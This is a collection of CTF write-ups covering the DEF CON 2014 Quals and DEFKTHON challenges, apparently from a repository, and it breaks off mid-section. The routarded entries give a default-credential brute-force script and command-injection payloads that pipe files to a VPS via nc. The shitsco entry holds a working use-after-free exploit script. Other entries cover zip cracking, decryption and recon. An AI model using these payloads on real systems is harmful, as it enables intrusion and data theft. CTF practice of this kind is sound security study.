In the router’s web interface, there was a page to ping IP addresses and domain names (amongst other things). When we attempted to add another command to that, the command was sanitized. For example, entering `8.8.8.8; ls` got sanitized into `8.8.8.8`. However, we saw the sanitizing happening in the browser. Seems like a case of JavaScript-only protection!

We disabled JavaScript in our browser and tried entering `; ls`. This effectively bypassed the filter (i.e. they didn’t do any sanitizing on the back-end), and we got the directory listing this time:

```
bower_components
flag
requirements.txt
routarded.py
static
templates
```

The `flag` file seemed like the right thing. Let’s enter `; cat flag`:

```
The flag is: l0l, can't believe they still do this shit
```

## Write-up 2 (by @d1rt_diggler)

**Note: this is from memory, so some details might be slightly off.**

### Casing the joint

Connecting to the server via browser greated you with a standard HTTP auth prompt. There was no splash page, and I don’t recall anything fancy in the headers, so no hints there…

###Defaults, okay, but WHICH defaults?
I started with your basics by hand (you never know!) admin:admin, admin:password, admin:blank, administrator:administrator, etc.
all without success, I didn't have a password list for router defaults on hand but about 2 minutes of Goog-fu turned some up.  I found http://defaultpassword.com and liked the format and variety, so I just did a full copy and paste of the home page (which lists all the passwords by default, awesome!) and dropped it into a text file.

The defaults were kind of weird though and since it seems to be crowd sourced the standarization for (blank), (none), n/a, etc. was... well, not standard.  I ended up passing the list through a couple grep and awk 1 liners to get only HTTP auth versions and to clean it up the non-standard types for "blank".
```
$ cat passwords.txt | awk '{print $6" "$7}' > first_pass.txt
$ cat first_pass.txt | awk {gsub('\\(none\\)','',$1); gsub('\\(none\\)','',$2);print $1" "$2}' > second_pass.txt
$ cat second_pass.txt | awk {gsub('n\\a','',$1); gsub('n\\a','',$2);print $1" "$2}' > third_pass.txt
$ cat third_pass.txt | awk {gsub('\\(blank\\)','',$1); gsub('\\(blank\\)','',$2);print $1" "$2}' > last_pass.txt
```
Those turned this...
```
3com    cellplex        7000    Telnet  admin   admin   Admin   No
3COM    CellPlex        7000    Telnet  tech    tech    Admin   No
3COM    CellPlex                HTTP    admin   synnet  Admin   No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  debug   synnet          No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  tech    tech            No
3COM    HiPerARC        v4.1.x  Telnet  adm     (none)  Admin   No
```
Into this... (roughly... it wasn't perfect, but I was aiming for "good enough")
```
admin admin
tech tech
admin synnet
debug synnet
tech tech
adm
```
Now we had a condensed list, but there were some dupes, no use in retrying pairs.
```
$ cat last_pass.txt | sort | uniq > uniq_pass.txt
```
This would turn
```
admin admin
admin admin
admin password
admin admin
admin administrator
admin admin
admin administrator
admin password
```
Into
```
admin admin
admin administrator
admin password
```
Which would reduce the amount of time it needed to test since we wouldn't be pointlessly testing the same creds over and over.

Now I wanted to format these into the HTTP user:pass format for curl
```
$ cat uniq_pass.txt | awk '{print $1":"$2}' > http_auths.txt
```
Which turned the list generated earlier into
```
admin:admin
tech:tech
admin:synnet
debug:synnet
tech:tech
adm:
```
###We've got our creds, now we need to test em'
Open up good ole vim and pumped out a shell script that would loop over the creds file and attempt
a curl to the router using a set of credentials... if it failed, it would be a 1 line error, if it
worked I'd see a flood of HTML content.

```bash
#!/usr/bin/env bash
users=$(cat http_auths.txt);
for user in $users; do
  echo $user;
  echo "";
  curl -u "$user" "http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/";
  echo "-----"
done;
```

Run it and scan the results for a successful auth.

```bash
$ ./test_auths | less
```

### `[BLANK]:admin`

Of course, the one default I didn’t think to try by hand… OF COURSE!

### Now we're in, let's look around
There really wasn't much to see, under the "tools" or "settings" tab (I can't remember which) there were
two tools that caught my eye, one was a traceroute, the other ping.  Running either returned nothing. I
actually thought something was misconfigured (like legitmately, not in the "break this piece" sense) and
looked around for a few more minutes before deciding to see if I could abuse the ping tool. I was going
in blind though since I couldn't tell if these tools were even getting to a system behind the scenes...
how could I do a simple blind test to see...

```
ping [ google.com ]
(page hangs for roughly 3 seconds, loads)
ping [ 127.asdf.asdf.174188 ]
(page loads immediately)
```

Hmmm okay, so it does seem like it's actually running a ping in the background, maybe it's injectable? I can't
really tell from the busted ass web UI tho... maybe I can get it to phone home.  I jump on my public facing VPS
and type in:

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
```

Time to find out...

```
ping [ 127.0.0.1; nc myvps.domains.lol 4545; ]
```

YEAH BUDDY!

```
Connection from 133.7.101.256:49245
```

### Scope the joint

Well we confirmed we had an injectable script, and we confirmed we could phone home, now we just need to
get our hands on that flag... but where the hell is it and where the hell am I?!

```
ping [ 127.0.0.1; ls -lahR /home/ | nc myvps.domains.lol 4545; ]
```

On my listening machine...

```
..snip..
/home/routarded/ (or / I don't remember...)
-rw-r--r--  1 routarded routarded  21   May 14 19:56 flag
..snip..
```

### Gettin’ the goods

Well, we've found it, so we’re pretty much done, all I need to do now is read the file and we’re golden.
```
ping [ 127.0.0.1; cat /home/routarded/flag | nc myvps.domains.lol 4545; ]
```

And on my listening machine...

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
Connection from 133.7.101.256:49245
The flag is: l0l, can't believe they still do this shit
```

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: sftp

**Category:** Gynophage
**Points:** 3
**Description:**

> Such a simple daemon.
>
> [http://services.2014.shallweplayaga.me/sftp_bf28442aa4ab1a4089ddca16729b29ac](sftp_bf28442aa4ab1a4089ddca16729b29ac)
>
> `sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me:115`

## Write-up

(TODO)

## Other write-ups

* <http://thejh.net/written-stuff/defcon-quals-2014-sftp-writeup>

# DEF CON CTF Qualifier 2014: shitsco

**Category:** Gynophage
**Points:** 2
**Description:**

> [http://services.2014.shallweplayaga.me/shitsco_c8b1aa31679e945ee64bde1bdb19d035](shitsco_c8b1aa31679e945ee64bde1bdb19d035) is running at:
>
> `shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337`
>
> Capture the flag.

## Write-up

Shitsco is a small router emulator. It allows you to ping, to tracert, to use the shell (Yhea, right! :D) and to set and view variables.

As we smell a rat in the variable handling we look into it.

Variables get stored dynamically in a double linked list as shown next.

```c
struct node {
    char *name;
    char *value;
    struct node *next;
    struct node *prev;
};
```

If you create a couple of nodes and delete the first, its strings get freed, their pointers set to NULL but not the link to the next node. Further, commands like show will always start the traversal by the first node, which will succeed until the corresponding memory gets overwritten. Thats what we gonna exploit.

The key is to set variable name and value the same size as a node internally has -> 4 * 4bytes = 16bytes.
So that when adding nodes, the strings and the node itself consume the same amount of memory.


The following is the memory layout with 3 nodes added(= 3 variables set). Note that there is no first node. The first node is in static memory. Also, every allocated heap block has the same length(size).

```
--------------------------------------------------------------
                   /----link----\
HEAP: [ S ][ S ][ N ][ S ][ S ][ N ][ S ][ S ]    N = Node
                 ^                                S = String
                 |
first.next ------/
--------------------------------------------------------------
```

Because of a bug in the system, the first node never gets unlinked properly.
When we delete it, only the strings get freed and set to NULL. The *next pointer stays the same.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][ N ][ S ][ S ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

Deleting also the second results as depicted next.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

The linked list is still intact because the *next pointers never gets set to NULL when deleting the fist node in the list.

When we now create a new node, the system will use the first static node again and just looks to allocate memory for the name and value. As we created uni-sized blocks, the malloc algorithm would use simply the first two free blocks again. Better would have been, if we had set the first block to a smaller size, let's say 11bytes, so the allocations would be like below.


```
--------------------------------------------------------------
 small\          /----link----\
HEAP: [ ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ----/
--------------------------------------------------------------
```

If we create now a new variable with 16bytes strings, the malloc algorithm would shift right by one because the first block is too small for both. That results in having the value string in the location the *first.next pointer still points to. By using good values for the string and link pointers we can get the password out of the memory.

>set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))


```
--------------------------------------------------------------
                 /----link----\
HEAP: [ ][ S ][ X ][   ][   ][ N ][ S ][ S ]    X = Fake node
first.next ----/
--------------------------------------------------------------
```

After getting the password, we just have needed to use it
> enable SecretPassword
>
> flag

unfotunately, we were not able to solve it in time.


## exploit.py

Set ip and port and use it with ./exploit.py or ./exploit.py -d

```python
#!/bin/python2
import socket
from struct import pack
import logging
import sys

# SETTINGS
###################################
TARGET = 'shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337
#TARGET = 'localhost:5000'

PASSWORD_ADDR =  0x804c3a0
NULL_NODE_ADDR = 0x804c37c

# Don't touch things below
TCP_IP, TCP_PORT = TARGET.split(':')
TCP_PORT = int(TCP_PORT)

BUF_SIZE = 2000
MARKER = 'aaa: '

# LOGGING
logging.basicConfig(format='%(message)s')
log = logging.getLogger(__name__)
if '-d' in sys.argv: log.setLevel(logging.DEBUG)
else: log.setLevel(logging.INFO)
D = log.debug
I = log.info

# HELPERS
###################################
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    data = s.recv(BUF_SIZE)
    D(data)
    return s

def disconnect(s):
    s.send('quit\n')
    data = s.recv(BUF_SIZE)
    D(data)
    s.close()

def show(s):
    cmd = 'show'
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)
    D(data)
    return data

def set_var(s, name, value='1'):
    cmd = 'set %s %s' % ( name, value)
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

def del_var(s, name):
    cmd = 'set %s' % name
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

# MAIN
###################################
s = connect()

set_var(s, 'a' * 11, '01234567890ABCDEF')
set_var(s, 'b' * 16, 'AKABKN|OWNS!!!111')
set_var(s, 'C' * 16, 'XXXXXXXXXXXXXXXXX')

del_var(s, 'a' * 11)
del_var(s, 'b' * 16)

set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))

data = show(s)
found = data.find(MARKER) if data else 0

if found:
    I('Password: %s', data[found + len(MARKER):data.find('\n$')])

disconnect(s)
```

## Other write-ups

* <https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln>
* <http://www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-1.html>

# DEF CON CTF Qualifier 2014: sick

**Category:** HJ
**Points:** 4
**Description:**

> I am sorry Sick Yoda.
> [services.2014.shallweplayaga.me/comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a](comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a)
> [services.2014.shallweplayaga.me/pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8](pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8)

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: turdedo

**Category:** Selir
**Points:** 3
**Description:**

> What a crappy protocol
> `turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me:3544`
> [http://services.2014.shallweplayaga.me/turdedo_5f55104b1d60779dbe8dcf5df2b186ad](turdedo_5f55104b1d60779dbe8dcf5df2b186ad)

## Write-up

(TODO)

## Other write-ups

* <http://acez.re/ctf-writeup-defcon-quals-2014-turdedo/>

# DEF CON CTF Qualifier 2014: zombies

**Category:** Duchess
**Points:** 2
**Description:**

> Aim small, miss small. Or not...your call.
>
> `zombies_8977dda19ee030d0ea35e97ad2439319.2014.shallweplayaga.me 20689`

## Write-up

TODO: Add detailed challenge description

Here is a working example:

```python
import socket
import math
import numpy
import time

def parse_level(text):
  level = 0
  for line in text.split('\n'):
    if line.strip().startswith("Level"):
      levelline = line.strip().split()
      level = int(levelline[1])

  if level < 10:
    x,y = parse_level1(text)
  else:
    x,y = parse_level2(text)

  return x, y

def parse_level1(text):
  x = 0
  y = 0
  level = 0
  for line in text.split('\n'):
    if line.startswith("The zombie is stalking"):
      line = line.split()
      x = int(line[6].replace('m', ''))
      y = int(line[11].replace('m', ''))
      print "Zombie is at: "
      print "x: ", x
      print "y: ", y
  return x,y

def parse_level2(text):
  x = 0
  y = 0
  level = 0
  for line in text.split('\n'):
    if line.startswith("The zombie is stalking"):
      splitline = line.split()
      zx = int(splitline[14].replace('m', ''))
      zy = int(splitline[19].replace('m', ''))
      px = int(splitline[28].replace('m', ''))
      py = int(splitline[33].replace('m', ''))

      print "Zombie is at: "
      print "x: ", zx
      print "y: ", zy
      print "Puppy is at: "
      print "x: ", px
      print "y: ", py

    if line.find("eats the puppy") != -1:
      eta = int(line.split(' ')[2])
      print "ETA dead puppy:", eta

    if line.find("gone by") != -1:
      # Consider +1 because of the wait
      my_time = int(line.split(' ')[0]) + 1
      print "Elapsed time:", my_time + 1

  new_x, new_y = calculate_position(zx, zy, px, py, eta, my_time)
  dummy = s.recv(1024)
  print dummy
  return new_x,new_y

def calculate_angle(velocity, x, y):

  angle1 = None
  angle2 = None

  g = 9.80665
  root = math.sqrt( (velocity**4) - g*( (g * (x**2)) + (2 * y * (velocity**2)) ))
  print "G", x
  angle1 = numpy.arctan((velocity**2 + root) / (g*x))
  angle2 = numpy.arctan((velocity**2 - root) / (g*x))

  angle1 = 180 * angle1 / math.pi
  angle2 = 180 * angle2 / math.pi

  print "Calculated angles:"
  print "Angle1:", angle1
  print "Angle2:", angle2

  return angle1, angle2

def calculate_position(zx, zy, px, py, eta, mytime):

  distx = px - zx
  disty = py - zy

  ratio = float(mytime) / float(eta)

  new_x = (distx * ratio) + zx
  new_y = (disty * ratio) + zy

  print "new coords:", new_x, new_y

  return new_x, new_y

def shoot(angle, x, y, gun="r"):

  dump = ""
  if gun == 'r':
    dump += "r, "
    # I'm sorry...
    global rcpt
    rcpt += 1
    print "Riffle count: " ,rcpt
  else:
    dump += "p, "
    # I'm sorry...
    global pcpt
    pcpt += 1
    print "pistol count: ", pcpt
  angle = str(angle)
  dump += angle + ', '
  dump += str(x) +", "
  dump += str(y) + "\n"

  print "Sending:"
  print dump

  s.send(dump)
  data = s.recv(1024)
  print data
  return data


HOST = "zombies_8977dda19ee030d0ea35e97ad2439319.2014.shallweplayaga.me"
PORT = 20689

RIFFLE = "2\n"
PISTOL = "3\n"

riffle_velocity = 975
pistol_velocity = 375

rcpt = 0
pcpt = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

# intro
data = s.recv(1024)

# pick guns
s.send(RIFFLE)
data = s.recv(1024)
s.send(PISTOL)
data = s.recv(1024)
print data

#Game Start
while(True):
  # Need to sleep otherwise misses on gun changes
  # This needs to be accounted for in the zombie's position
  time.sleep(2)
  x, y = parse_level(data)
  # Hint said 50ish... not enough pistolling at 50ish
  if x < 55 and pcpt < 43:
    a1, a2 = calculate_angle(pistol_velocity, x, y)
    data = shoot(a2, x, y, gun='p')
  else:
    a1, a2 = calculate_angle(riffle_velocity, x, y)
    data = shoot(a2, x, y, gun='r')
  if data.lower().find("flag") != -1:
    break

s.close()
```

## Other write-ups

* <http://sigint.ru/writeups/2014/05/19/defcon-2014-quals---zombies/>

# DEFKTHON CTF: Crypto 100

**Description:**

> ucoizsbtkxhtadcg

## Write-up

During the CTF, [a hint for this challenge was provided](https://twitter.com/OpenSecurity_IN/status/440755363285966848):

> [Crypto 100] Clue: Vinegar

Since this is crypto challenge, the clue could be an indication that this is a [Vigenère cipher](http://en.wikipedia.org/wiki/Vigenère_cipher).

Let’s fire up a Windows VM, open Cryptool 1, enter the ciphertext `ucoizsbtkxhtadcg`, and do some analysis. Go to _Analysis_ → _Symmetric Encryption (Classic)_ → _Vigenère (Analysis according to Schroedel…)_ and click _Start analysis_. The analysis takes a few minutes. Once it’s finished, click _Show analysis results_, and exactly 9011 possible encryption keys and deciphered texts are presented:

```
CrypTool: Ciphertext-only analysis according to Schroedel against Vigenère cipher
Time needed to perform analysis:758 seconds
Length of analyzed ciphertext: 16 characters
Keyword language(s): English
Ciphertext language: English

Ciphertext:
UCOIZSBTKXHTADCG

…
```

At this point I guessed that either the encryption key or the deciphered text would contain `FLAG` so I searched the result set for that. It turned out that many of the deciphered texts started with `FLAGIS`, so I decided to focus on those first:

```bash
$ grep -B3 'FLAGIS' results.txt
114. Possible key:
PROCRASTINATIONS
Found cleartext:
FLAGISJACKHASPPO
--
418. Possible key:
PROCRASTINATING
Found cleartext:
FLAGISJACKHASQWR
--
419. Possible key:
PROCRASTINATION
Found cleartext:
FLAGISJACKHASPPR
--
420. Possible key:
PROCRASTINATORS
Found cleartext:
FLAGISJACKHAMMKR
--
836. Possible key:
PROCRASTINATED
Found cleartext:
FLAGISJACKHAWANP
--
837. Possible key:
PROCRASTINATES
Found cleartext:
FLAGISJACKHAWLNP
--
838. Possible key:
PROCRASTINATOR
Found cleartext:
FLAGISJACKHAMMNP
--
1493. Possible key:
PROCRASTINATE
Found cleartext:
FLAGISJACKHAWOLS
```

At this point I tried entering `JACKHASPPO`, `JACKHASQWR`, etc. as the flag, but none of them were accepted. Looking through the list again, one of the cleartexts stood out:

```
420. Possible key:
PROCRASTINATORS
Found cleartext:
FLAGISJACKHAMMKR
```

`JACKHAMMKR` wasn’t accepted either, and neither was `JACKHAMMER`. However, since the ciphertext was originally in lowercase instead of uppercase, I figured the expected cleartext was probably in lowercase too. So I guessed `jackhammer` was the flag, which turned out to be correct!

P.S. With the knowledge that `jackhammer` is the correct flag, we can figure out the encryption key that was originally used: `PROCRASTINATORY`. (Apparently this word is not included in the English dictionary used by Cryptool.)

## Other write-ups

* none yet

# DEFKTHON CTF: Crypto 200

**Description:**

> [RSA!!](encr02.7z)

## Write-up

The provided [`encr02.7z`](encr02.7z) archive contains two files: `enc` and `rsa`. The former is (from its name) clearly an encrypted message. The filename and contents of the latter hint that the message is encrypted with RSA. The `rsa` file is just a JSON file, with base64-encoded values for properties such as `primeP` and `primeQ` and a more interesting one: `privateExponent`. Unless this is a red herring, this private-key value can be used to decrypt the encrypted message.

Given that the `rsa` file is a "structured" JSON file, lead me to believe that it was exported from some application. Searching for the properties on Google, quickly showed that it came from [Keyczar](https://code.google.com/p/keyczar/), "an open source cryptographic toolkit designed to make it easier and safer for developers to use cryptography in their applications". Knowing this, the decryption would be straightforward: read the private key into Keyczar and use that to decrypt the message.

Actually, it required an additional step, because of (correct me if I'm incorrect) [key encapsulation](http://en.wikipedia.org/wiki/Key_encapsulation). Apparently, only the first 261 characters of the encrypted message could be decrypted using the RSA key (I figured out it was 261 by encrypting several strings, and these always resulted in a 261-character-long string). The decryption of the first 261 characters of the encrypted message results in following JSON string:

``` json
{"hmacKey": {"hmacKeyString": "L_YKADwsSRdPYYioRV-xjn0cWHCKnBIc1j8EmJzRrJY", "size": 256}, "aesKeyString": "zzqP2s4p8XWuFLhXbhLxoQ", "mode": "CBC", "size": 128}
```

This JSON data referencing an AES-key can then be used in Keyczar to decrypt the rest of the message, which eventually results in finding the flag: `the flag is hipsteralert`. The following snippet shows how this challenge can be solved with just a handful of lines of Python code (note that it requires the `python-keyczar` package).

``` python
with open('rsa', 'r') as f:
    rsa = f.read()
with open('enc', 'rb') as f:
    enc = f.read()
import keyczar.keys
key = keyczar.keys.RsaPrivateKey.Read(rsa)
rsaDecrypted = key.Decrypt(enc[:261]) # use RSA to decrypt first 261 ( = len(key.Encrypt('foo')) ) characters of enc
aesKey = keyczar.keys.AesKey.Read(rsaDecrypted)
print aesKey.Decrypt(enc[261:]) # use AES to decrypt the rest of enc
```

## Other write-ups

* none yet

# DEFKTHON CTF: Crypto 300

**Description:**

> The key to finding the truth lies with my namesake. [Download](encr03.jpg)

## Write-up

This is a photo of Emma Stone. (TODO)

## Other write-ups

* none yet

# DEFKTHON CTF: Crypto 400

**Description:**

> Alice and Bob went a long way in crypto. They designed a super secure crypto system to encrypt their messages. We managed to steal the source and some other information. Find the FLAG!
>
> [File](challenge.txt)
> We also got this: [Download](400.zip)

## Write-up

(TODO)

## Other write-ups

* <http://www.0xdeffbeef.com/2014/03/defkthon-ctf-2014-find-flag-crypto-400.html>

# DEFKTHON CTF: Miscellaneous 100

**Description:**

> He is so FAT.
> Flag is the md5 of a windows command with numericals in it.

## Write-up

Apparently the expected answer was `289cca92d315659c671f51ad8e0f06d3`, the MD5 hash of `8dot3name`. This is not really a Windows command, though – although it can be used as an argument to [`fsutil`](http://technet.microsoft.com/en-us/library/ff621566.aspx).

## Other write-ups

* none yet

# DEFKTHON CTF: Miscellaneous 200

**Description:**

> [Flag is Here!](flag.txt)

## Write-up

The provided `flag.txt` file contains tuples of three comma-separated values on each line. This looks like an image with given RGB values.

In total, there are 61366 lines:

```bash
$ wc -l flag.txt
61366 flag.txt
```

The dimensions of the image are dividers of this number, so possibly: 1, 2, 61, 122, 503, 1006, 30683, 61366. The most likely image size is 122×503px or 503×112px.

### Solution 1: using PPM

The easiest way to convert this text file into an image, is by converting it to the PPM format with the following header:

```ppm
P3
122 503
255
```

…then followed by the contents of `flag.txt`, with any commas replaced by spaces. The result is [`flag.ppm`](flag.ppm).

Let’s convert it to PNG, and flip + rotate it to make it easier to read:

```bash
$ convert -flip -rotate 90 flag.ppm flag.png
```

This results in [the following image](flag.png):

![flag{ youc@n'tseeme }](flag.png)

### Solution 2: using Python and PIL

Using some string parsing and the Python Imaging Library (PIL), an image can be drawn pixel by pixel from the given RGB values.  The dimensions were the tricky part, as using exact multiples overflowed the program, so using one set value for the width and a very high number for the height, the image was drawn well enough.

```python
from PIL import Image
import numpy

pixels = open("flag.txt").read().split("\n")
del pixels[-1]

myPixelsArray = ()

for x in pixels:
  array = x.split(",")
  array = tuple([int(w) for w in array])
  myPixelsArray += array

myImage = Image.new("RGB", (122, 503))

myImage.putdata(myPixelsArray)

myImage.save("flag.jpg")
```

The image, when cropped and flipped, shows the following:

![flag{ youc@n'tseeme }](flag.jpg)

## Other write-ups

* <http://www.0xdeffbeef.com/2014/03/defkthon-ctf-2014-flag-is-here-misc-200.html>
* <http://www.cravetocode.com/2014/03/defkthon-ctf-misc-200-writeup.html>

# DEFKTHON CTF: Miscellaneous 300

**Description:**

> [Check This](73168.zip)

## Write-up

The provided [`73168.zip`](73168.zip) file is password-protected. Cracking the password using `fcrackzip` reveals that an all-numeric password was used, and that the zip file contains another password-protected zip file, which in turn contains another password-protected zip file, etc.

Let’s write a script that recursively cracks and extracts the zip files:

```bash
#!/usr/bin/env bash

while [ -e *.zip ]; do
  files=*.zip;
  for file in $files; do
    echo -n "Cracking ${file}… ";
    output="$(fcrackzip -u -l 1-6 -c '1' *.zip | tr -d '\n')";
    password="${output/PASSWORD FOUND\!\!\!\!: pw == /}";
    if [ -z "${password}" ]; then
      echo "Failed to find password";
      break 2;
    fi;
    echo "Found password: \`${password}\`";
    unzip -q -P "${password}" "$file";
    rm "${file}";
  done;
done;
```

Leave it running for a while, and you’ll end up with `12475.zip`, a zip file with a slightly more complex password. Let’s crack it:

```bash
$ fcrackzip -u -l 1-6 -c 'a1' 12475.zip
PASSWORD FOUND!!!!: pw == b0yzz
```

The password is `b0yzz`. Let’s unzip:

```bash
$ unzip -q -P b0yzz 12475.zip
```

We end up a file named [`mess.wav`](mess.wav). Open it in a sound editor like Audacity, and view the sound waves as a spectrogram.

![](flag.jpg)

It reveals the text `BallsRealBolls`, which is the flag.

## Alternative approach

An alternative way to come up with the passwords for all the intermediate zip files, is by using `unzip -l` to list the compressed file’s file name (which was always the same as the password for the parent zip for this challenge):

```bash
#!/usr/bin/env bash

f="$1";

while test -e "$f"; do
  mv "$f" _a.zip;
  p=$(unzip -l _a.zip | grep -v Archive | grep zip | awk '{print $NF}' | sed 's:\.zip::'| head -1);
  echo "File = '_a.zip', password = '$p'";
  unzip -P "$p" _a.zip;
  f="$p.zip";
  ls -l "$f";
done;
```

## Other write-ups

* none yet

# DEFKTHON CTF: Miscellaneous 400

**Description:**

> TODO

## Write-up

(TODO)

## Other write-ups

* none yet

# DEFKTHON CTF write-ups

* <http://54.201.96.212/>
* [Official Twitter account with challenge hints](https://twitter.com/OpenSecurity_IN)
* [Scoreboard](http://54.201.96.212/Score)

## Completed write-ups

* [crypto-100](crypto-100)
* [crypto-200](crypto-200)
* [misc-100](misc-100)
* [misc-200](misc-200)
* [misc-300](misc-300)
* [recon-100](recon-100)
* [recon-200](recon-200)
* [recon-250](recon-250)
* [reversing-100](reversing-100)
* [reversing-200](reversing-200)
* [reversing-300](reversing-300)
* [reversing-400](reversing-400)
* [web-200](web-200)
* [web-300](web-300)
* [web-400](web-400)

## Incomplete write-ups

* [crypto-300](crypto-300)
* [crypto-400](crypto-400)
* [misc-400](misc-400)
* [web-100](web-100)

# DEFKTHON CTF: Recon 100

**Description:**

> [Francis Alexander](https://www.google.co.in/#q=Francis+Alexander)

## Write-up

Francis Alexander is a programmer who works for Opensec. He has a GitHub account: <https://github.com/torque59> This account has <http://wiredcreation.blogspot.in/> set as the website for this user.

The flag is hidden on <http://wiredcreation.blogspot.in/2014/02/nosql-exploitation-framwework-released.html>. Inspect the DOM using your browser’s developer tools to look for HTML comments (note: plain view-source won’t work as the content is loaded through Ajax). You’ll eventually see this:

```html
<!-- flag{hmm_try_nosql_dbs_dude}-->
```

The flag is `hmm_try_nosql_dbs_dude`.

## Other write-ups

* none yet

# DEFKTHON CTF: Recon 200

**Description:**

> [Yashin Mehaboobe](https://www.google.com/#q=Yashin+Mehaboobe)

## Write-up

The Google search results indicate that Yashin has a GitHub account named [@Sp3ctr3](https://github.com/Sp3ctr3). His recent activity reveals [a commit with the following details](https://github.com/Sp3ctr3/arcanum-server/commit/40fd912b6d9f0cf022b10fac72a6c7b6760bfe37):

```
From 40fd912b6d9f0cf022b10fac72a6c7b6760bfe37 Mon Sep 17 00:00:00 2001
From: Yashin Mehaboobe <yashinm92@gmail.com>
Date: Mon, 10 Feb 2014 23:19:29 +0530
Subject: [PATCH] Updated README for better readability.

Flag is djangounchained
```

The flag is `djangounchained`.

## Other write-ups

* none yet

# DEFKTHON CTF: Recon 250

**Description:**

> Crack Ajin’s [message](http://pastebin.com/nGvKgY23).
> Only [Ajin Abraham](https://www.google.com/#q=ajin+abraham) can help you!

## Write-up

The message provided in the challenge description is a PGP-encrypted email. Let’s start by downloading it and saving it as [`message.pgp`](message.pgp):

```bash
$ curl 'http://pastebin.com/raw.php?i=nGvKgY23' > message.pgp
```

In order to decrypt the message, we’re gonna need the private key used to encrypt it.

Luckily, the HTML source code of [Ajin’s website](http://opensecurity.in/ajinabraham.com/) has this in it:

```
<!--pastebin DOT com/TYHfKbtt-->
```

This leads to a PGP private key. Let’s download it and save it as [`private.key`](private.key):

```bash
$ curl 'http://pastebin.com/raw.php?i=TYHfKbtt' > private.key
```

Now let’s import the private key and use it to decrypt the message:

```bash
$ gpg --allow-secret-key-import --import private.key
gpg: key 8708771F: secret key imported
gpg: key 8708771F: "xboz <xboz@mailinator.com>" not changed
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg --decrypt message.pgp

You need a passphrase to unlock the secret key for
user: "xboz <xboz@mailinator.com>"
4096-bit RSA key, ID 8708771F, created 2014-02-18

Enter passphrase:
```

Too bad; we need the private key’s passphrase before we can decrypt the message. You could bruteforce the passphrase, but there was another way to get it for this challenge. [Ajin’s contact form](http://opensecurity.in/ajinabraham.com/) contains the following HTML:

```html
<p id="mail-failure">Unable to send your email! (--wankoff--)</p>
```

It turns out `wankoff` is the passphrase.

```bash
$ gpg --decrypt message.pgp

You need a passphrase to unlock the secret key for
user: "xboz <xboz@mailinator.com>"
4096-bit RSA key, ID 8708771F, created 2014-02-18

gpg: WARNING: cipher algorithm AES256 not found in recipient preferences
gpg: encrypted with 4096-bit RSA key, ID 8708771F, created 2014-02-18
      "xboz <xboz@mailinator.com>"
flag { Pretty007G00d007Privacy }
```

The flag is `Pretty007G00d007Privacy`.

## Other write-ups

* <http://www.0xdeffbeef.com/2014/03/defkthon-ctf-2014-crack-ajins-message.html>

# DEFKTHON CTF: Reversing 100

**Description:**

> [Hackers are Here](100.exe)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

First we want to know the type of file we are dealing with. On Linux `file 100.exe` returns that it's a .NET assembly. If you open it in IDA you will also be told it's a .NET program. For a bit of background, there's also [TrID](http://mark0.net/soft-trid.html) to identify file types, [PROTECTiON iD](http://pid.gamecopyworld.com/) to detect binary packets, the older [PEiD](http://www.aldeid.com/wiki/PEiD), etc.

I used [IDA](https://www.hex-rays.com/products/ida/) to view the .NET intermediate language instructions, and [JetBrains dotPeek](http://www.jetbrains.com/decompiler/) to disassemble the code. After removing all useless code dotPeek shows the following:

```
private void pictureBox1_Click(object sender, EventArgs e)
{
  try
  {
    int num1 = (int) MessageBox.Show([...]);
    int num2 = 1337;
    int num3 = 0;
    int num4 = int.Parse(string.Concat(new object[4]
    {
      (object) "121299999999999999999999999999999999999B0wB4me4iamr",
      (object) num3,
      (object) num3,
      (object) "t99999999999999999999999999999999999999"
    }));
    string str = (string) (object) num2 + (object) num4.ToString();
    for (int index = 0; index <= num4; ++index)
      num4 = num4 + (num2 ^ 1337) + num2 * 2000 / 1337 / 1337 / 24;
    this.Usehint();
  }
  catch { }
}

public void Usehint() { }

private void InitializeComponent()
{
  [...]
  this.label1.Location = new Point(701, 242);
  this.label1.Text = "      key is md5(sha1)";
  [...]
}
```

We see the hint `key is md5(sha1)`, which is not visible when running the program because the position of the label is outside the window. So we need to find a key and calculate the MD5 and SHA1 hash of it. Though the `Usehint()` function appears empty, in IDA we can see that it actually loads a string but does nothing with it:

```
